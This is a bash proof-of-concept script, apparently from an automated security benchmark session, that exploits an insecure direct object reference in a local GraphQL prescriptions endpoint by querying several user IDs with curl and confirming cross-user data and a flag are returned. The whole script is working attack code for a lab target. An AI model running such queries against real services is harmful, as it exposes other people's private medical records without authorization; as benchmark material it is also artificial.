#!/bin/bash
# POC: Demonstrates IDOR vulnerability by accessing prescriptions for different user IDs without authorization checks
# Target: ./repo
# Created: 2025-11-10T19:41:29.649Z
# Session: benchmark-XBEN-007-24-mhtjlewb

# IDOR Vulnerability POC - Cross-User Prescription Access
# This script demonstrates an Insecure Direct Object Reference (IDOR) vulnerability
# in the getPrescriptions GraphQL query where userId parameter is not properly validated

TARGET_URL="http://localhost:5003/graphql"

echo "=========================================="
echo "IDOR Vulnerability POC - Prescription Access"
echo "=========================================="
echo ""

# Test 1: Query userId 1 (Admin user)
echo "[*] Test 1: Querying prescriptions for userId 1..."
RESPONSE_1=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }"}')

echo "[+] Response for userId 1:"
echo "$RESPONSE_1" | jq '.' 2>/dev/null || echo "$RESPONSE_1"
echo ""

# Extract data to verify we got results
USER_1_COUNT=$(echo "$RESPONSE_1" | jq '.data.getPrescriptions | length' 2>/dev/null || echo "0")
echo "[+] Number of prescriptions retrieved for userId 1: $USER_1_COUNT"
echo ""

# Test 2: Query userId 2 (Different user)
echo "[*] Test 2: Querying prescriptions for userId 2..."
RESPONSE_2=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ getPrescriptions(userId: 2) { id userId prescriptionDetails flag } }"}')

echo "[+] Response for userId 2:"
echo "$RESPONSE_2" | jq '.' 2>/dev/null || echo "$RESPONSE_2"
echo ""

# Extract data to verify we got results
USER_2_COUNT=$(echo "$RESPONSE_2" | jq '.data.getPrescriptions | length' 2>/dev/null || echo "0")
echo "[+] Number of prescriptions retrieved for userId 2: $USER_2_COUNT"
echo ""

# Test 3: Query userId 3 (Yet another user)
echo "[*] Test 3: Querying prescriptions for userId 3..."
RESPONSE_3=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ getPrescriptions(userId: 3) { id userId prescriptionDetails flag } }"}')

echo "[+] Response for userId 3:"
echo "$RESPONSE_3" | jq '.' 2>/dev/null || echo "$RESPONSE_3"
echo ""

USER_3_COUNT=$(echo "$RESPONSE_3" | jq '.data.getPrescriptions | length' 2>/dev/null || echo "0")
echo "[+] Number of prescriptions retrieved for userId 3: $USER_3_COUNT"
echo ""

# Vulnerability verification
echo "=========================================="
echo "VULNERABILITY VERIFICATION"
echo "=========================================="

# Check if all requests returned successfully
if echo "$RESPONSE_1" | jq -e '.data.getPrescriptions' > /dev/null 2>&1 && \
   echo "$RESPONSE_2" | jq -e '.data.getPrescriptions' > /dev/null 2>&1 && \
   echo "$RESPONSE_3" | jq -e '.data.getPrescriptions' > /dev/null 2>&1; then
  echo "[!] VULNERABILITY CONFIRMED: Successfully accessed prescriptions for multiple users"
  echo "[!] This demonstrates IDOR - userId parameter is not properly validated"
  echo "[!] An attacker can access ANY user's prescriptions by manipulating the userId"
  
  # Check if different user data was returned
  USER_1_ID=$(echo "$RESPONSE_1" | jq '.data.getPrescriptions[0].userId' 2>/dev/null)
  USER_2_ID=$(echo "$RESPONSE_2" | jq '.data.getPrescriptions[0].userId' 2>/dev/null)
  
  if [ ! -z "$USER_1_ID" ] && [ ! -z "$USER_2_ID" ] && [ "$USER_1_ID" != "$USER_2_ID" ]; then
    echo "[!] Confirmed: Retrieved different user data (userId $USER_1_ID vs $USER_2_ID)"
  fi
  
  exit 0
else
  echo "[-] Could not verify vulnerability - endpoints not responding as expected"
  exit 1
fi